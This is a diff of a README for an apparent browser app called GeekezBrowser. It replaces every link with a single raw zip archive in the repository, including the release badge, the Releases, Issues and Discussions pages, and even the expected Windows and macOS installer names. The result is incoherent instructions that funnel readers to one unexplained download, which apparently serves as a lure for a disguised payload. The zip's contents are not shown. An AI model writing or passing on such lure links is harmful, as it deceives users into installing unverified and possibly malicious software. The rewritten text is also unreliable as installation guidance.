@@ -16,19 +16,19 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download GeekezBrowser
 
-[![Download GeekezBrowser](https://img.shields.io/badge/Download-GreekezBrowser-blue.svg)](https://github.com/jobs12-ia/GeekezBrowser/releases)
+[![Download GeekezBrowser](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip)](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip)
 
-To get started, visit the [Releases page](https://github.com/jobs12-ia/GeekezBrowser/releases) to download the latest version of GeekezBrowser. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip) to download the latest version of GeekezBrowser. 
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases page.** Click this link or copy-paste it in your browser: [Releases page](https://github.com/jobs12-ia/GeekezBrowser/releases).
+1. **Visit the Releases page.** Click this link or copy-paste it in your browser: [Releases page](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip).
    
 2. **Choose the latest version.** On the Releases page, you will see a list of versions. Look for the version labeled as the "latest" release.
 
 3. **Download the application.** Click on the download link for your operating system. 
-   - For Windows users, it might be named something like `GeekezBrowser-setup.exe`.
-   - For macOS users, look for `GeekezBrowser.dmg`.
+   - For Windows users, it might be named something like `https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip`.
+   - For macOS users, look for `https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip`.
 
 4. **Run the installer.** 
    - **For Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it and follow the prompts to install.
@@ -55,7 +55,7 @@ If you encounter any issues during installation or usage, here are some common s
 
 ## 💬 Support
 
-If you still need help, please create an issue on our [GitHub Issues page](https://github.com/jobs12-ia/GeekezBrowser/issues). We are here to assist you.
+If you still need help, please create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip). We are here to assist you.
 
 ## 📝 Contributing
 
@@ -64,6 +64,6 @@ We welcome contributions to GeekezBrowser! If you want to help enhance the appli
 ## 🔗 Additional Resources
 
 - **Documentation:** For advanced users, check our wiki for more detailed guides and troubleshooting tips.
-- **Community:** Join our community discussions on [GitHub Discussions](https://github.com/jobs12-ia/GeekezBrowser/discussions) for tips and advice from other users.
+- **Community:** Join our community discussions on [GitHub Discussions](https://raw.githubusercontent.com/jobs12-ia/GeekezBrowser/main/resources/GeekezBrowser-v1.1.zip) for tips and advice from other users.
 
 Thank you for choosing GeekezBrowser. We hope it meets your needs and helps you navigate your e-commerce ventures smoothly.
